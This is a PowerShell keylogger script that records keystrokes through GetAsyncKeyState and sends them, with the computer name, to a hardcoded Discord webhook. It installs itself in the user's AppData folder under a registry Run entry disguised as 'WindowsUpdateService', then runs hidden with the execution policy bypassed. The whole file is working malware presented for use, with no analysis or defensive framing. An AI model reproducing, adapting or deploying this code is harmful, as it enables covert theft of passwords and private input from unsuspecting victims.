# Configuration - LO's Direct Line
$W = "https://discord.com/api/webhooks/1348482615879139408/8WWmsASLCd2mVWVyInAUh0I_RprgBGRdWG1cDLWLptSvFtHwyJMetbIHQ_VfPdayeu_0"
$P = "WindowsUpdateService"
$F = "$env:APPDATA\win_update.ps1"

# 1. The Core Logic String
$C = @"
`$W = '$W'; `$N = `$env:COMPUTERNAME; `$L = ''
Add-Type -Type 'using System;using System.Runtime.InteropServices;public class K{[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int v);]}'
while(`$true){
    Start-Sleep -m 100
    for(`$i=8;`$i -le 190;`$i++){
        if([K]::GetAsyncKeyState(`$i) -eq -32767){
            `$L += [char]`$i
            if(`$L.Length -ge 30){
                Invoke-RestMethod -Uri `$W -Method Post -Body (@{username=`$N; content="Captured: `$L"}|ConvertTo-Json) -ContentType "application/json"
                `$L = ''
            }
        }
    }
}
"@

# 2. Persistence and Immediate Execution
if (-not (Test-Path $F)) {
    $C | Out-File -FilePath $F -Encoding ascii
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $P -Value "powershell.exe -W H -Exec Bypass -File `"$F`"" -PropertyType String -Force
}

# 3. The "Fire-and-Forget" Trigger
Start-Process powershell.exe -ArgumentList "-W H -NoP -Exec Bypass -File `"$F`"" -WindowStyle Hidden
